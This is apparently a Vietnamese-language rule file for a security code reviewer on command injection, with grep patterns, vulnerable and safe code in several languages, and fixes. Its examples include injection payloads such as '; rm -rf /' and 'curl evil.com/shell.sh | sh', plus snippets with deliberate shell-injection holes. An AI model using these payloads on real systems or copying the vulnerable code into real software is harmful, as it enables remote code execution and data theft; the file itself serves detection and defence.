---
id: COMMAND-INJECTION
severity_max: CRITICAL
applies_to: all
---

# Command Injection

## Intent

Truyền user input vào shell (`bash`, `cmd.exe`) không escape → hacker thêm `; rm -rf /` hoặc `$(curl evil.com/shell.sh | sh)`. Đây là **RCE trực tiếp** — chiếm server, đọc env (lộ AWS key), pivot vào internal network.

Pattern điển hình: `os.system("convert " + filename + " out.png")`. User upload `name "; cat /etc/passwd; echo "x"` → server chạy `cat /etc/passwd`.

Vibe coder hay dùng shell wrapper (`subprocess.run(cmd, shell=True)`, `child_process.exec`) vì "tiện viết string" — thay vì truyền argv list (an toàn).

## Khi nào CRITICAL

- `os.system`, `subprocess.run(..., shell=True)`, `os.popen` với user input
- Node `child_process.exec(cmd)` (KHÔNG phải `execFile` / `spawn` với arg list)
- PHP `system`, `exec`, `shell_exec`, `passthru`, backtick, `popen`
- Ruby `system("...#{var}...")`, backticks, `%x{}`, `Kernel.exec`
- Go `exec.Command("sh", "-c", userInput)` hoặc `exec.Command("bash", "-c", ...)`
- Template với shell: `f"ffmpeg -i {user_file} out.mp4"` truyền vào shell
- Filename / URL từ user input ghép trực tiếp vào shell command

## Khi nào HIGH (giảm cấp)

- Có escape (`shlex.quote`, `escapeshellarg`) nhưng dùng sai (escape arg nhưng vẫn `shell=True` rồi nhúng manually)
- User input qua whitelist trước (chỉ alphanumeric) — vẫn warn nhưng giảm
- Code internal CLI tool không expose lên internet

## Cách reasoning (KHÔNG pattern-match thuần)

1. **Grep** tìm shell-exec function
2. **Read** mỗi call site:
   - Tham số có concat / format với biến không?
   - Biến đó trace ngược về đâu? L1 (user input) → CRITICAL
   - Có dùng list-arg form (an toàn) không?
3. **Trace flow**:
   - `req.body.filename` → `exec("convert " + filename)` → shell injection
   - `req.body.filename` → `execFile("convert", [filename, "out.png"])` → an toàn (argv không qua shell)
4. **shell=False mặc định**: Python `subprocess.run(["cmd", arg])` không qua shell — an toàn nếu argv list.

## Search patterns (gợi ý — KHÔNG chạy literal, dùng Grep tool)

### Python

```
os\.system\s*\(
os\.popen\s*\(
subprocess\.(run|call|Popen|check_output|check_call).*shell\s*=\s*True
commands\.(getoutput|getstatusoutput)   # deprecated
```

### Node.js

```
child_process\.exec\s*\(    # exec qua shell
require\s*\(\s*["']child_process["']\s*\)\.exec
\.execSync\s*\(
shelljs\.exec
```

### PHP

```
\bsystem\s*\(
\bexec\s*\(
shell_exec\s*\(
passthru\s*\(
popen\s*\(
proc_open\s*\(
\`[^`]*\$\w+   # backtick với var
```

### Go

```
exec\.Command\s*\(\s*["'](sh|bash|cmd|/bin/sh|/bin/bash)["']\s*,\s*["']-c["']
exec\.CommandContext\s*\(\s*[^,]+,\s*["'](sh|bash)["']
```

### Ruby

```
system\s*\(.*#\{
%x\{.*#\{
\`[^`]*#\{   # backtick với interpolation
Kernel\.(system|exec|spawn)
```

### Java

```
Runtime\.getRuntime\(\)\.exec\s*\(\s*[^\[]   # exec(String) qua shell-ish; exec(String[]) an toàn
ProcessBuilder\(\s*"sh",\s*"-c"
```

## Examples

### CRITICAL — flag

```python
# Python — concat user input vào shell
import os
@app.route('/convert')
def convert():
    fname = request.args.get('file')
    os.system(f"convert /tmp/{fname} /out/{fname}.png")
    # ?file=a; rm -rf /
```

```python
# subprocess shell=True
subprocess.run(f"ffmpeg -i {user_url} out.mp4", shell=True)
# user_url = "x; curl evil.com/shell.sh | sh; #"
```

```javascript
// Node — exec với template literal
const { exec } = require('child_process');
app.post('/ping', (req, res) => {
  exec(`ping -c 4 ${req.body.host}`, (err, stdout) => {
    res.send(stdout);
  });
});
// host = "8.8.8.8; cat /etc/passwd"
```

```php
// PHP — shell_exec với GET
<?php
$ip = $_GET['ip'];
echo shell_exec("ping -c 4 " . $ip);   // ?ip=1.1.1.1;whoami
?>
```

```go
// Go — sh -c với user input
cmd := exec.Command("sh", "-c", "echo "+r.URL.Query().Get("name"))
out, _ := cmd.Output()
```

```ruby
# Ruby — interpolation trong system
system("convert #{params[:file]} out.png")
# file = "x; cat /etc/shadow"
```

### NOT critical — không flag

```python
# subprocess với argv list — KHÔNG qua shell
subprocess.run(["convert", user_file, "out.png"], check=True)
# user_file = "x; rm -rf /" → bị treat literal as filename, không execute
```

```javascript
// Node — execFile với arg array
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', req.body.host], (err, stdout) => {
  res.send(stdout);
});
// host được pass as argv[1], không qua shell parsing
```

```php
// PHP — escapeshellarg + escapeshellcmd
$ip = escapeshellarg($_GET['ip']);
echo shell_exec("ping -c 4 " . $ip);   // wrapped in single-quote
// Note: vẫn nên dùng pcntl_exec/proc_open với arg array
```

```go
// Go — exec.Command với separate args
cmd := exec.Command("ping", "-c", "4", host)   // host là argv[3], không phải shell string
```

```python
# Whitelist trước
if not re.match(r'^[a-zA-Z0-9_.-]+$', fname):
    abort(400)
subprocess.run(["convert", f"/tmp/{fname}", "out.png"])
```

## Fix recommendation

1. **Đừng dùng shell**, dùng argv list:
   ```python
   # Python — list arg
   subprocess.run(["convert", user_file, out_file], check=True)   # shell=False default
   ```
   ```javascript
   // Node — execFile / spawn
   const { execFile } = require('child_process');
   execFile('convert', [userFile, outFile], cb);
   ```
   ```go
   exec.Command("convert", userFile, outFile)
   ```
2. **Nếu BẮT BUỘC shell** (vd: pipe), escape đúng cách:
   ```python
   import shlex
   cmd = "grep " + shlex.quote(pattern) + " /var/log/app.log | wc -l"
   subprocess.run(cmd, shell=True)
   ```
   ```php
   $arg = escapeshellarg($input);
   ```
3. **Whitelist input** trước khi truyền (chỉ cho phép `[a-zA-Z0-9_.-]`).
4. **Đừng concat path**: nếu user cung cấp filename, sanitize với `path.basename()` / `os.path.basename()` + check không có `..`.
5. **Dùng library** thay vì shell out: image convert → Pillow/Sharp; ping → ICMP library; SSH → paramiko (không shell).
6. **Drop privilege**: nếu phải shell, chạy bằng user thấp quyền (không root).
7. **AppArmor / seccomp** giới hạn syscall của process.
8. **Log mọi command exec** + alert pattern nghi vấn (`;`, `|`, `$(`, backtick).

## Cross-references

- Cross-check với `04-path-traversal` (nếu có): filename `../../bin/sh`
- Cross-check với `16-unrestricted-file-upload`: upload + exec → full RCE chain
- Cross-check với `17-verbose-error-debug-mode`: command output leak qua error
- Cross-check với `02-sql-injection` (nếu có): cùng class injection vulnerability
